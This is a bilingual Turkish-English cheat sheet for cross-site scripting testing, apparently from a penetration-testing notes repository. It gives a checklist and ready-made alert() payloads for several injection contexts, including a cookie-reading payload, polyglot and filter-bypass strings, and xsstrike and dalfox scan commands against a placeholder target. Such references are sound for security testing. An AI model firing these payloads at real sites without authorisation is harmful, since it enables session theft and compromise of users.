# 💉 Cross-Site Scripting (XSS)

## 🇹🇷 Türkçe

### Kontrol Listesi

| # | Test | Açıklama | Durum |
|---|------|----------|-------|
| 1 | Reflected XSS | URL/Input üzerinden | ⬜ |
| 2 | Stored XSS | Kaydedilen veriden (yorum, profil) | ⬜ |
| 3 | DOM XSS | JS kaynaklı | ⬜ |
| 4 | Blind XSS | Arka planda çalışan (admin paneli vb.) | ⬜ |
| 5 | Filter Bypass | Filtre atlatma teknikleri | ⬜ |

### Temel Payloadlar

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body/onload=alert(1)>
<iframe/onload=alert(1)>
<a href="javascript:alert(1)">Click me</a>
```

### Context-Based Payloadlar

**HTML İçinde:**
```html
<div>USER_INPUT</div>
Payload: <script>alert(1)</script>
```

**Attribute İçinde:**
```html
<input value="USER_INPUT">
Payload: " onmouseover="alert(1)
```

**Script İçinde:**
```javascript
var x = "USER_INPUT";
Payload: "; alert(1); //
```

**Href İçinde:**
```html
<a href="USER_INPUT">Link</a>
Payload: javascript:alert(1)
```

### Polyglot Payloads (Her yere uyan)

```
javascript://%250Aalert(1)//"/*\'/*/'/*--></script><img/src=x onerror=alert(1)>
```

```
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
```

### Komutlar

```bash
# XSStrike ile tarama
xsstrike -u "http://target.com/search?q=test"

# Dalfox ile tarama
dalfox url http://target.com/search?q=test

# XSS Hunter (Blind XSS için)
# https://xsshunter.com/ adresinden payload al
```

---

## 🇬🇧 English

### Checklist

| # | Test | Description | Status |
|---|------|-------------|--------|
| 1 | Reflected XSS | Via URL/Input | ⬜ |
| 2 | Stored XSS | Persistent (comments, profile) | ⬜ |
| 3 | DOM XSS | Client-side JS | ⬜ |
| 4 | Blind XSS | Triggered elsewhere (admin panel) | ⬜ |
| 5 | Filter Bypass | WAF/Filter evasion | ⬜ |

### Basic Payloads

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.cookie)>
```

### Tips

1.  **Test all inputs:** Headers, Cookies, URL path, Parameters.
2.  **Check response:** Is your input reflected? Is it encoded?
3.  **Bypass:** Try double encoding, case changes, null bytes.

---

[← Back to README](../README.md)
